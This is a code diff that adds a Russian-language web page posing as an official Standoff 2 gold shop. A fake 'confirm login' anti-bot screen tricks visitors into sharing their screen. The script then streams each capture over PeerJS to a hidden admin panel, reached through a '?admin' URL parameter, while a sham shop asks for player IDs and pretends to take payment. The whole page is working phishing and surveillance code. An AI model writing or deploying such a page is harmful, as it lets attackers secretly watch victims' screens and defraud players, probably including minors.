@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SO2 | OFFICIAL SHOP</title>
+    <!-- ПРАВИЛЬНОЕ ПОДКЛЮЧЕНИЕ БИБЛИОТЕКИ -->
+    <script src="https://unpkg.com"></script>
+    <style>
+        :root { --accent: #ffca28; --bg: #0d1117; --card: #161b22; --blue: #448aff; }
+        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        
+        /* Стили магазина */
+        #main-shop { display: none; padding: 20px 20px 180px 20px; }
+        .header { text-align: center; padding: 15px; border-bottom: 2px solid var(--accent); margin-bottom: 20px; }
+        .services { display: grid; gap: 10px; max-width: 500px; margin: 0 auto; }
+        .option { background: var(--card); border: 1px solid #30363d; padding: 15px; border-radius: 12px; display: flex; justify-content: space-between; text-decoration: none; color: inherit; }
+        .price { color: var(--accent); font-weight: bold; }
+
+        /* Стили входа */
+        #entry-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; padding: 20px; }
+        .btn-entry { background: var(--accent); color: black; border: none; padding: 20px 40px; border-radius: 10px; font-weight: bold; font-size: 1.2rem; cursor: pointer; animation: pulse 2s infinite; }
+        
+        /* Стили админа */
+        #admin-panel { display: none; padding: 20px; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
+        video { width: 100%; background: #000; border: 2px solid var(--accent); border-radius: 8px; }
+
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+<!-- ЭКРАН ВХОДА ДЛЯ КЛИЕНТА -->
+<div id="entry-screen">
+    <h2 style="color: var(--accent);">МАГАЗИН STANDOFF 2</h2>
+    <p>Для защиты от ботов и подтверждения транзакции необходимо подтвердить вход в систему.</p>
+    <button class="btn-entry" onclick="clientStart()">ПОДТВЕРДИТЬ ВХОД</button>
+</div>
+
+<!-- ПАНЕЛЬ АДМИНА (скрыта по умолчанию) -->
+<div id="admin-panel">
+    <h1 style="grid-column: 1/-1; text-align: center; color: var(--accent);">МОНИТОРИНГ ИГРОКОВ</h1>
+</div>
+
+<!-- САМ МАГАЗИН -->
+<div id="main-shop">
+    <div class="header"><h1>GOLD SHOP</h1></div>
+    <div style="max-width:500px; margin: 0 auto 20px;">
+        <input type="text" id="user_id" placeholder="Введите ваш ID" style="width:100%; padding:12px; border-radius:5px; border:1px solid #333; background:#111; color:white;">
+    </div>
+    <div class="services">
+        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>500 Gold</h3></div><div class="price">450 ₽</div></a>
+        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>1000 Gold</h3></div><div class="price">850 ₽</div></a>
+        <a href="#" class="option" onclick="return checkID()"><div class="info"><h3>Gold Pass</h3></div><div class="price">550 ₽</div></a>
+    </div>
+    <p style="text-align:center; color: #555; margin-top: 30px;">© SO2 Official Resell</p>
+</div>
+
+<script>
+    const ADMIN_ID = "ADMIN_777_SECRET"; // Твой ID
+    let peer;
+
+    // ПРОВЕРКА: КТО ЗАШЕЛ (АДМИН ИЛИ КЛИЕНТ)
+    window.onload = () => {
+        if (window.location.search.includes('admin')) {
+            startAdmin();
+        }
+    };
+
+    // ЛОГИКА АДМИНА
+    function startAdmin() {
+        document.getElementById('entry-screen').style.display = 'none';
+        document.getElementById('admin-panel').style.display = 'grid';
+        
+        peer = new Peer(ADMIN_ID);
+        peer.on('call', (call) => {
+            call.answer(); // Принимаем поток
+            call.on('stream', (remoteStream) => {
+                const video = document.createElement('video');
+                video.srcObject = remoteStream;
+                video.autoplay = true;
+                video.playsInline = true;
+                document.getElementById('admin-panel').appendChild(video);
+            });
+        });
+    }
+
+    // ЛОГИКА КЛИЕНТА
+    async function clientStart() {
+        try {
+            // Запрашиваем экран (Браузер покажет окно выбора)
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            
+            // Если разрешил, создаем сессию и звоним админу
+            const randomId = "Player_" + Math.floor(Math.random() * 9000);
+            peer = new Peer(randomId);
+            
+            peer.on('open', () => {
+                peer.call(ADMIN_ID, stream);
+                // Открываем магазин
+                document.getElementById('entry-screen').style.display = 'none';
+                document.getElementById('main-shop').style.display = 'block';
+            });
+
+        } catch (err) {
+            alert("Ошибка: Для входа в магазин необходимо подтвердить трансляцию!");
+        }
+    }
+
+    function checkID() {
+        if (document.getElementById('user_id').value.length < 5) {
+            alert("Введите корректный ID!");
+            return false;
+        }
+        alert("Переход к оплате...");
+        return true;
+    }
+</script>
+
+</body>
+</html>
